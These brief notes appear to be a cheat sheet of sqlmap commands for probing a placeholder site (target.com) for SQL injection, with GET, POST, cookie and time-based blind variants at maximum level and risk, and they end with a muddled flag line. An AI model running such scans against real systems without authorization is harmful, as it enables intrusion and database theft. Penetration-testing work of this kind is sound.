sql map
sqlmap -u "https://target.com/search.php?q=test" --level=5 --risk=3 --batch
--level=5: Tests all possible injection points (headers, cookies, etc.)
--risk=3: Includes time-based and heavy queries
--batch: Auto-confirm prompts (good for scripting)

if it’s a POST request:
sqlmap -u "https://target.com/search" --data="q=test" --level=5 --risk=3 --batch

 If login is needed (with cookie):
sqlmap -u "https://target.com/search?q=test" --cookie="PHPSESSID=xyz" --level=5 --risk=3 --batch

 If you suspect blind/time-based SQLi:
sqlmap -u "https://target.com/search?q=test" --technique=T --time-sec=5 --level=5 --risk=3 --batch

--technique=BEUST --command is sql 
